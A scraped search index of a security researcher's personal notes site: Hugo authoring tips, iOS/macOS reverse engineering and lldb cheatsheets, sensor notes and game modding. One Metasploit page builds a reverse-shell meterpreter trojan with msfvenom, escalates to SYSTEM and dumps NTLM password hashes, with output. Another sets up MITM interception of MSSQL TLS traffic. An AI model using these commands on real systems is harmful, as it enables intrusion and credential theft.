NOTE: shortcodes are commented-out, NOTE: the correct syntax is {{ \u0026lt;..\u0026gt; }} without spaces between {} \u0026amp; \u0026lt;\u0026gt;   Clear and consistent Integrate well with art CLI  Including Images To include images, copy the image to /content/posts/images/*. Then when you want to include it, use either of:\n# =\u0026gt; like this ![Image Caption](/posts/images/image-of-choice.png) # =\u0026gt; or {{ \u0026lt; imgcap title=\u0026#34;Image Caption\u0026#34; src=\u0026#34;/posts/images/image-of-choice.png\u0026#34; \u0026gt; }} The folder images in content/posts is created to index those files/images in the final build or deploy, and therefore removes the overhead of the Hugo processing. Some more documentation on Hugo website.\nIncluding Files To include files of any type, ready to be downloaded, copy the file to /content/posts/files/*. Then include it in your post as instructed below:\n[File to Download](/posts/files/some_file_to_download-example.pdf) The folder files in content/posts is created to index those files in the final build/deploy.\nMarkdown Styled Blocks\n::: alert red This is a **Red Alert!** Take cover. ::: ::: alert red This is a Red Alert! Take cover. :::\nMedia Insertion\nUse quotes markdown block:\n\u0026gt; https://vimeo.com/1234567 FontAwesome Icons\nWikipedia Insertion\nYou can either use named parameters:\n{{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;fr\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;fr\u0026#34; title=\u0026#34;\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; title=\u0026#34;VIC Cipher\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;en\u0026#34; title=\u0026#34;VIC Cipher\u0026#34; \u0026gt; }} Use FontAwesome Icon Library:\n# =\u0026gt; in markdown (md) ## Some of my photos :fa-camera-retro: Highlight Lines\nList of supported languages\n# =\u0026gt; xml {{ \u0026lt; highlight xml \u0026#34;linenos=table, linenostart=11, hl_lines=1 3\u0026#34;\u0026gt; }} \u0026lt;category blog=\u0026#34;posts\u0026#34;\u0026gt; \u0026lt;label xml:lang=\u0026#34;en\u0026#34; text=\u0026#34;Article\u0026#34; /\u0026gt; \u0026lt;/category\u0026gt; {{ \u0026lt; /highlight \u0026gt; }} # =\u0026gt; go {{ \u0026lt; highlight go \u0026#34;linenos=table,hl_lines=8 15-17,linenostart=199\u0026#34; \u0026gt; }} // ... code {{ \u0026lt; / highlight \u0026gt; }} # =\u0026gt; go - specific lines go { linenos=table,hl_lines=[8,\u0026#34;15-17\u0026#34;],linenostart=199 } // ... code Reference a link\n{{ \u0026lt; ref /blog \u0026gt; }} Shortcodes Caption images via this shortcode\n\u0026lt;span class=\u0026#34;caption-wrapper\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; title=\u0026#34;Sample caption\u0026#34; alt=\u0026#34;Sample caption\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;caption-text\u0026#34;\u0026gt;Sample caption\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; {{ \u0026lt; imgcap title=\u0026#34;Sample caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; \u0026gt; }} Insert Gist via this line\n{{ \u0026lt; gist duraki 78985452 \u0026gt; }} Include Instagram image in the note\n# =\u0026gt; https://www.instagram.com/p/BWNjjyYFxVx/ # =\u0026gt; Normal Instagram view {{ \u0026lt; instagram BWNjjyYFxVx \u0026gt; }} # =\u0026gt; Hide caption {{ \u0026lt; instagram BWNjjyYFxVx hidecaption \u0026gt; }} Include Tweet in the note\n# =\u0026gt; https://twitter.com/SanDiegoZoo/status/1453110110599868418 {{ \u0026lt; tweet user=\u0026#34;SanDiegoZoo\u0026#34; id=\u0026#34;1453110110599868418\u0026#34; \u0026gt; }} Hide something\n{{ \u0026lt; details \u0026gt; }} This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience. {{ \u0026lt; /details \u0026gt; }}\n{{ \u0026lt; details \u0026ldquo;Read More\u0026rdquo; \u0026gt; }} Note: Some note for further details, or hidden image/text/component. {{ \u0026lt; /details \u0026gt; }}\nMore shortcodes on official website.\nDeploy To deploy localy, use any server and a generator\n# =\u0026gt; build $ ruby art notes local # =\u0026gt; for local environment $ ruby art notes hybrid # =\u0026gt; for prod environment # =\u0026gt; serve $ php -S 127.0.0.1:8800 # =\u0026gt; in $REPO_ROOT directory ",url:"https://duraki.github.io/notes/how-to-write-notes/"},"https:\/\/duraki.github.io\/notes\/posts\/images\/":{title:"Images",tags:[],content:"",url:"https://duraki.github.io/notes/posts/images/"},"https:\/\/duraki.github.io\/notes\/ios-reverse-engineering\/":{title:"iOS Reverse Engineering",tags:[],content:"Using class-dump\n$ class-dump -S -s -H App -o /path/to/headers/App/  Frida \u0026amp; Objection Tutorial LLDB Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis  References\n iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis  ",url:"https://duraki.github.io/notes/ios-reverse-engineering/"},"https:\/\/duraki.github.io\/notes\/ios-static-analysis\/":{title:"iOS Static Analysis",tags:[],content:" Find all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied  ",url:"https://duraki.github.io/notes/ios-static-analysis/"},"https:\/\/duraki.github.io\/notes\/jailbreak-bypass\/":{title:"Jailbreak Bypass",tags:[],content:"If jailbreak detection persists in iOS application, try these tricks:\n Libery Lite via Cydia, then go to settings, and then select the application Recommended Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Manual Patching, the old school way  ",url:"https://duraki.github.io/notes/jailbreak-bypass/"},"https:\/\/duraki.github.io\/notes\/linux-notes\/":{title:"Linux Notes",tags:[],content:"Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username ",url:"https://duraki.github.io/notes/linux-notes/"},"https:\/\/duraki.github.io\/notes\/list-of-tools\/":{title:"List of Tools",tags:[],content:"apktool, android, openssl\n",url:"https://duraki.github.io/notes/list-of-tools/"},"https:\/\/duraki.github.io\/notes\/list-of-topics\/":{title:"List of Topics",tags:[],content:"Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes Single-Board Computers (SBC)  Raspberry Pi Installation Enable SSH access via SD Card Building Kali Linux for Banana Pro Mounting SD Cards Mounting (ext4) partition in MacOS   🎱 Uplink (game) Modding How to write Notes Troubleshoot ~ ideas  ",url:"https://duraki.github.io/notes/list-of-topics/"},"https:\/\/duraki.github.io\/notes\/lldb\/":{title:"lldb",tags:[],content:"Cheatsheet Objective-C Important \u0026ndash; set a lldb language context to Objective-C:\n(lldb) settings set target.language objc Cast an address to object:\n(lldb) po ((MKPinAnnotationView *)0x7df67c50).alpha \u0026hellip;\nSwift Important \u0026ndash; set a lldb language context to Swift:\n(lldb) settings set target.language swift Import a Library in the lldb context:\n# =\u0026gt; Library expr -l Swift -- import UIKit # =\u0026gt; Custom Classes expr -l Swift -- import MyTestProject expr -l Swift -- let $vc = unsafeBitCast(0x7fad22c066d0, ViewController.self) expr -l Swift -- print($vc.view) Create a new class from lldb:\nexpression let $myHello = HelloClass() po $myHello Call a method from a class:\npo $myHello.hello() Get an object address of current instance:\n(lldb) p tabView.controlTint (NSControlTint) $R10 = defaultControlTint (lldb) p self (LearningStoryboard.NSTabViewController) $R11 = 0x00006080000e2280 { # =\u0026gt; then cast this address to x object. @see below. Cast an address to object:\n(lldb) e let $pin = unsafeBitCast(0x7df67c50, MKPinAnnotationView.self) (lldb) po $pin # =\u0026gt; then you can work with $pin as usual – access properties, call methods, etc. Multiplatform (ObjC + Swift) If you want to run an lldb expression depending on the scope, use:\nexpression -l objc -o -- HelloClass* class = [[HelloClass alloc] init] # =\u0026gt; obj-c expression -l swift -o -- let $myHello = HelloClass() # =\u0026gt; swift lldb Errors and Workarounds Attach Failed Not allowed to attach to process:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:\n$ cat /tmp/debug_entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security-get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.cs.disable-library-validation\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.device.audio-input\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ codesign --force --options runtime --sign - --entitlements /tmp/debug_entitlements.plist /Apps/MyApp.app Attach Failed (cont.) This is only for stand-alone binaries such is ls or cat.\nSolution:\n$ cat /tmp/debug-ent.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security.get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ sudo codesign --sign \u0026#34;signature\u0026#34; -f --timestamp --entitlements ./debug-ent.xml WriteActivationData.bin You are required to create signature certificate from the Keychain.app.\nTerminated due to code signing error Happens when codesign is not put in place. Need to codesign a Macho binary:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) Process 8873 exited with status = 9 (0x00000009) Terminated due to code signing error Solution:\n# =\u0026gt; Create a new Code Signing certificate in Keychain Access, then ... $ codesign --deep --force -s \u0026#34;signature\u0026#34; /Apps/MyApp.app ",url:"https://duraki.github.io/notes/lldb/"},"https:\/\/duraki.github.io\/notes\/macos-notes\/":{title:"MacOS Notes",tags:[],content:"Check Application entitlement\n# ~\u0026gt; brew install jtool # =\u0026gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =\u0026gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.application-identifier\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;J6S6Q257EK.ch.protonvpn.mac\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;com.apple.developer.maps\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; ... libSystem.B.dylib\nAll API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.\nMount RaspberryPi / BananaPi SD Card\nInsert SD Card in your card reader or Macbook. Then when the error pops-up, just hit \u0026ldquo;Ignore\u0026rdquo; (not Eject!).\nThe SD Card should be visible by the MacOS, but not mounted, as such:\n$ diskutil list ... /dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *15.9 GB disk2 1: Linux 1.3 GB disk2s1 (free space) 14.6 GB - Make sure to install macfuse, and ext4fuse:\n$ brew install macfuse $ brew install ext4fuse # =\u0026gt; might throw an error, @see below for instructions # 1) the first possibility is to install osxfuse first, and then try ext4fuse again # ie. # brew install --cask osxfuse # brew install ext4fuse # Make sure to reboot your system, because of the new Kext/Kernel extension. # 2) the other option is to manually force ext2fuse via the script. the script are #	in this notes, right below. ``` Make a mountable directory on your Mac and mount the SD card: $ mkdir ~/raspberry # =\u0026gt; or /Volumes/raspberry for natural choice $ sudo ext4fuse /dev/disk2s1 ~/raspberry -o allow_other\n *note*: adding `allow_other` for this SD card should be readable by everyone To unmount the SD Card, just simply use: ``` $ sudo diskutil unmount /dev/disk2s1 $ sudo diskutil unmountDisk /dev/disk2 $ sudo diskutil unmountDisk ~/raspberry Installing ext4fuse in MacOS\nDownload the script below, and save it somewhere in your machine, then run:\n$ brew install --formula --build-from-source /tmp/ext4fuse.rb (note: paste the following in /tmp/ext2fuse.rb:\n# =\u0026gt; cat /tmp/ext2fuse.rb class MacFuseRequirement \u0026lt; Requirement fatal true satisfy(build_env: false) { self.class.binary_mac_fuse_installed? } def self.binary_mac_fuse_installed? File.exist?(\u0026#34;/usr/local/include/fuse/fuse.h\u0026#34;) \u0026amp;\u0026amp; !File.symlink?(\u0026#34;/usr/local/include/fuse\u0026#34;) end env do ENV.append_path \u0026#34;PKG_CONFIG_PATH\u0026#34;, HOMEBREW_LIBRARY/\u0026#34;Homebrew/os/mac/pkgconfig/fuse\u0026#34; ENV.append_path \u0026#34;PKG_CONFIG_PATH\u0026#34;, \u0026#34;/usr/local/lib/pkgconfig\u0026#34; unless HOMEBREW_PREFIX.to_s == \u0026#34;/usr/local\u0026#34; ENV.append_path \u0026#34;HOMEBREW_LIBRARY_PATHS\u0026#34;, \u0026#34;/usr/local/lib\u0026#34; ENV.append_path \u0026#34;HOMEBREW_INCLUDE_PATHS\u0026#34;, \u0026#34;/usr/local/include/fuse\u0026#34; end end def message \u0026#34;macFUSE is required. Please run `brew install --cask macfuse` first.\u0026#34; end end class Ext4fuse \u0026lt; Formula desc \u0026#34;Read-only implementation of ext4 for FUSE\u0026#34; homepage \u0026#34;https://github.com/gerard/ext4fuse\u0026#34; url \u0026#34;https://github.com/gerard/ext4fuse/archive/v0.1.3.tar.gz\u0026#34; sha256 \u0026#34;550f1e152c4de7d4ea517ee1c708f57bfebb0856281c508511419db45aa3ca9f\u0026#34; license \u0026#34;GPL-2.0\u0026#34; head \u0026#34;https://github.com/gerard/ext4fuse.git\u0026#34; bottle do sha256 cellar: :any, catalina: \u0026#34;446dde5e84b058966ead0cde5e38e9411f465732527f6decfa1c0dcdbd4abbef\u0026#34; sha256 cellar: :any, mojave: \u0026#34;88c4918bf5218f99295e539fe4499152edb3b60b6659e44ddd68b22359f512ae\u0026#34; sha256 cellar: :any, high_sierra: \u0026#34;fc69c8993afd0ffc16a73c9c036ca8f83c77ac2a19b3237f76f9ccee8b30bbc9\u0026#34; sha256 cellar: :any, sierra: \u0026#34;fe8bbe7cd5362f00ff06ef750926bf349d60563c20b0ecf212778631c8912ba2\u0026#34; sha256 cellar: :any, el_capitan: \u0026#34;291047c821b7b205d85be853fb005510c6ab01bd4c2a2193c192299b6f049d35\u0026#34; sha256 cellar: :any, yosemite: \u0026#34;b11f564b7e7c08af0b0a3e9854973d39809bf2d8a56014f4882772b2f7307ac1\u0026#34; end depends_on \u0026#34;pkg-config\u0026#34; =\u0026gt; :build on_macos do depends_on MacFuseRequirement =\u0026gt; :build end on_linux do depends_on \u0026#34;libfuse\u0026#34; end def install system \u0026#34;make\u0026#34; bin.install \u0026#34;ext4fuse\u0026#34; end end ",url:"https://duraki.github.io/notes/macos-notes/"},"https:\/\/duraki.github.io\/notes\/magnetoresistive-sensors\/":{title:"Magnetoresistive Sensors",tags:[],content:"This type of sensor is particulary suitable for advanced stability control applications, in which sensing at zero, or near zero speed is required.\n  A permanent magnet in the sensor produces a magnetic field, with the magnetic field stream at a right angle to the sensing element\n  The sensor element is ferromagnetic alloy. It changes its resistance based on the influence of magnetic fields.\n  If the high portion of the pulse wheel approaches the sensing element, a deflection of the magnetic field stream is created. This creates a resistance change in a thin film ferromagnetic layer of the sensor element.\n  An example of magnetoresistive sensors components is as following:\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Example - Magnetoresistive Sensors Component  After assembly of listed components, such magnetoresistive sensor will look like this:\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Example - Post-assembly of listed Components  The sensor element is affected by the direction of the magnetic field (not the field strength).\n  The field strength is not important, as long as it is/above certain level. This allows the sensor to tolerate variations in the magnetic field strength (caused by age, temperature, mechanical lifetime \u0026hellip;).  The resistance change in the sensor affects the voltage that is supplied by the evaulation circuit. A small amount of voltage is provided to the sensor elment; which is monitored, and the voltage changes (1 to 100mV) are converted into current pulses by the evaulation module.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Conversion of voltages to current pulses if sensor element voltage is changed  The sensor is supplied 12V by the Control Unit. Output voltage from the sensor is approximately 10V. The Control Unit counts the high and low current pulses to determine the wheel speed.\nTypical Application of Hall Effect Sensors  Currently used for wheel speed sensors  ",url:"https://duraki.github.io/notes/magnetoresistive-sensors/"},"https:\/\/duraki.github.io\/notes\/metasploit-framework\/":{title:"Metasploit Framework",tags:[],content:"Create executable trojan\n$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)\n$ msfconsole ... [loaded] msf5 exploit(multi/handler) \u0026gt; use multi/handler msf5 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; set LHOST 192.168.153.128 LHOST =\u0026gt; 192.168.153.128 msf5 exploit(multi/handler) \u0026gt; set LPORT 8888 LPORT =\u0026gt; 8888 msf5 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 192.168.153.128:8888 [*] Sending stage (179779 bytes) to 192.168.153.133 [*] Meterpreter session 1 opened (192.168.153.128:8888 -\u0026gt; 192.168.153.133:49915) at 2020-06-21 11:27:30 +0200 meterpreter \u0026gt; ls Listing: C:\\trojan ================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100777/rwxrwxrwx 73802 fil 2020-06-21 11:27:13 +0200 dolphin.exe Common Commands\nGet SYSTEM shell\n$ meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). $ getuid SYSTEM\\* Get available privileges\n$ meterpreter \u0026gt; getprivs Enabled Process Privileges Name: SeBackupPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeCreatePagefilePrivilege SeCreateSymbolicLinkPrivilege SeDebugPrivilege SeImpersonatePrivilege SeIncreaseBasePriorityPrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege SeLoadDriverPrivilege SeManageVolumePrivilege SeProfileSingleProcessPrivilege SeRemoteShutdownPrivilege SeRestorePrivilege SeSecurityPrivilege SeShutdownPrivilege SeSystemEnvironmentPrivilege SeSystemProfilePrivilege SeSystemtimePrivilege SeTakeOwnershipPrivilege SeTimeZonePrivilege SeUndockPrivilege Dump hashes\n$ meterpreter \u0026gt; hashdump **--\u0026gt; usually error, we can use kiwi (load kiwi) or mimikatz (load mimikatz) View Kiwi or Hashdump\n## =\u0026gt; kiwi method $ load kiwi $ meterpreter \u0026gt; lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : SUPERASME SysKey : 2191beee37c928bbf9e2de8f685b5227 Local SID : S-1-5-21-716707718-802779726-1162805411 SAMKey : 3d3b9a321a53397e7082da89be862a1e RID : 000001f4 (500) User : Administrator RID : 000001f5 (501) User : Guest RID : 000001f7 (503) User : DefaultAccount RID : 000001f8 (504) User : WDAGUtilityAccount Hash NTLM: dfa827b88238ba5def8e431fe9503a34 RID : 000003e9 (1001) User : Asmir Hadzic Hash NTLM: ed2ae0d1f7e22ca3187d8e8d91d968c7 ## =\u0026gt; hashdump method meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 2191beee37c928bbf9e2de8f685b5227... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa827b88238ba5def8e431fe9503a34::: Asmir Hadzic:1001:aad3b435b51404eeaad3b435b51404ee:ed2ae0d1f7e22ca3187d8e8d91d968c7::: Other Commands\nMeterpreter consists of a large number of commands which are categorized in their respective categories, namely:\n Core Commands STDapi : File Commands STDapi : Networking Commands STDapi : File- System Commands STDapi : User Interface Commands STDapi : Web Cam Commands Priv : Elevate Commands Priv : Password database Commands Priv : Time Stomp commands  ",url:"https://duraki.github.io/notes/metasploit-framework/"},"https:\/\/duraki.github.io\/notes\/mitm_intercept\/":{title:"MITM_Intercept",tags:[],content:"Configure your MacOS to point /etc/private/hosts to real server.\nNext use the following script to print and return handlers.\n## basic intercept tcp macos desktop via /etc/private/hosts def handle_request(message): print(message) return message + b\u0026#34;\\x00\u0026#34; def handle_response(message): # Both functions must return a message. print(message) return message Run mitm_intercept.py with the following command line:\n$ mitm_intercept.py -l u:x.x.x.x:port t:x.x.x.x.x:port -t u:x.x.x.x:port x.x.x.x:port -p x.x.x.x:8080\nReferences:\n via -l listener via u: \u0026amp; t: udp + tcp listener via -t target via -p proxy listener (burp) via -m (mix connection) performs TCP relay without SSL handshake   In this case, the communication goes through the HTTP modification server running on 127.0.0.1:49999 (via MITM Intercept) and Burp\u0026rsquo;s proxy.\n Connection to MSSQL is made by TDS Protocol on top of TCP. The authentication itself is performed with TLS on top of the TDS protocol. To see intercept that TLS process, we will need two patchy modification scripts:\n# =\u0026gt; demo-script-handler-1.py from time import time from struct import pack from pathlib import Path def handle_request(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message with open(\u0026#34;msg_req\u0026#34; + str(time()), \u0026#34;wb\u0026#34;) as f: f.write(message[:8]) return message[8:] def handle_response(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message path = Path(\u0026#34;.\u0026#34;) try: msg_res = min(i for i in path.iterdir() if i.name.startswith(\u0026#34;msg_res\u0026#34;)) data = msg_res.read_bytes() msg_res.unlink() except ValueError: data = b\u0026#39;\\x12\\x01\\x00\\x00\\x00\\x00\\x01\\x00\u0026#39; return data[:2] + pack(\u0026#34;\u0026gt;h\u0026#34;, len(message)+8) + data[4:] + message # =\u0026gt; demo-script-handler-2.py from time import time from struct import pack from pathlib import Path def handle_request(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message path = Path(\u0026#34;.\u0026#34;) try: msg_req = min(i for i in path.iterdir() if i.name.startswith(\u0026#34;msg_req\u0026#34;)) data = msg_req.read_bytes() msg_req.unlink() except ValueError: data = b\u0026#39;\\x12\\x01\\x00\\x00\\x00\\x00\\x01\\x00\u0026#39; return data[:2] + pack(\u0026#34;\u0026gt;h\u0026#34;, len(message)+8) + data[4:] + message def handle_response(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message with open(\u0026#34;msg_res\u0026#34; + str(time()), \u0026#34;wb\u0026#34;) as f: f.write(message[:8]) return message[8:]ž With that, and tmux:\nstart a backbone listener with script (1):\n$ python mitm_intercept.py -l 192.168.48.1:49801 -t 127.0.0.0.1:49801 -p 127.0.0.1:8080 -s demo-script-handler-1.py\nstart a tls proxy\n$ python mitm_intercept.py -m -l 127.0.0.1:49801 -t 127.0.0.1:49800 -p 127.0.0.1:8080 -w 127.0.0.1:49998 -lc cert.pem -lk key.pem -tv tls1 -ci ALL:eNULL\n  (the above uses a listener configuration with a certificate and a private key, you are obligated to change tls version and the chipers manually. the target will be third listener)  start a target listener with script (2):\n$ python mitm_intercept.py -l 127.0.0.1:49800 -t 192.168.48.128:49801 -p 127.0.0.1:8080 -s demo-script-handler-2.py -w 127.0.0.1:49997\nstart a target udp listener for targeted db:\n$ python mitm_intercept.py -l u:192.168.48.1:1434 -t u:192.168.48.128.1434 -p 127.0.0.1:8080 -w 127.0.0.1:49996\n",url:"https://duraki.github.io/notes/mitm_intercept/"},"https:\/\/duraki.github.io\/notes\/modding-uplink-by-introversion\/":{title:"Modding Uplink by Introversion",tags:[],content:"Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.\nChanging the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read. You can change this behaviour by patching address:\n00000001000cdd28 mov ecx, 0xa ; argument #4 for method sub_1000a2da0 What this does is replace the default Uplink UI font size from 9 to 10, making it appear larger on the screen and more easier to read. Looking at the source code, the following item is present:\n// taken from: uplink/src/uplink.cpp void Init_Fonts	() { ... success = (GciLoadTrueTypeFont ( HELVETICA_10, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 9 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_12, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 11 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_18, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 16 )); The above fixes the first call of GciLoadTrueTypeFont() function, and changing the default mov ecx, 0x9 to mov ecx, 0xa (10). Produce a new binary and run it from MacOS application directory. Voi-la! 🎉\nReferences: uplink/src/uplink.cpp\nDefinitions Some interesting definitions have been identified.\nGame World and Mapped Data\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.h` #define	WORLD_START_DATE	0, 0, 0, 24, 2, 2010	#define	GAME_START_DATE	0, 0, 0, 24, 3, 2010	// ;) #define	PLAYER_START_BALANCE	3000 #define	PLAYER_START_GATEWAYNAME	\u0026#34;Gateway ALPHA \u0026#34; #define	PLAYER_START_CPUTYPE	\u0026#34;CPU ( 60 Ghz )\u0026#34; #define	PLAYER_START_MODEMSPEED	1 #define	PLAYER_START_MEMORYSIZE	24 // also see #define	IP_LOCALHOST	\u0026#34;127.0.0.1\u0026#34; // also see #define	TICKSREQUIRED_* #define	TRACESPEED_* #define	HACKDIFFICULTY_* #define	PROB_MISSION_* #define	PAYMENT_* #define MINDIFFICULTY_* #define TIME_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* Global App Defines\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/app/globals_defines.h` #define	ALPHA	0.85f	// Alpha value used for interface #define	ALPHA_DISABLED	0.5	// Alpha value for disabled buttons //#define	CHEATMODES_ENABLED	// Eg all-links, all-software, password-bypass etc Game Data, Titles, World Map Gateways, SW/HW Upgrades\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.cpp` UPLINKRATING [] 